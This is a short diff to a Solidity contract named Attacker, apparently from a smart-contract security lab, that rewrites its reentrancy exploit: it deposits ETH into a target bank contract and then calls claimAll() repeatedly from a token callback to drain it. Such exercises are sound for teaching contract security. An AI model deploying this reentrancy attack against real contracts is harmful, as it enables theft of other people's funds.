@@ -38,13 +38,13 @@ contract Attacker is AccessControl, IERC777Recipient {
       require( address(bank) != address(0), "Target bank not set" );
       require(msg.value >= amt, "Not enough ETH sent");
 
-        // Step 1: Deposit into bank
-        bank.deposit{value: amt}();
 
-        emit Deposit(amt);
-
-        // Step 2: Trigger first withdraw (this starts reentrancy)
-        bank.withdraw(amt);
+	    // Step 1: deposit ETH
+	    bank.deposit{value: amt}();
+	    emit Deposit(amt);
+	
+	    // Step 2: start exploit
+	    bank.claimAll();
 	}
 
 	/*
@@ -73,7 +73,7 @@ contract Attacker is AccessControl, IERC777Recipient {
             depth++;
 
             // Re-enter the bank's withdraw function
-            bank.withdraw(amount);
+	    bank.claimAll();
         }
     }
 
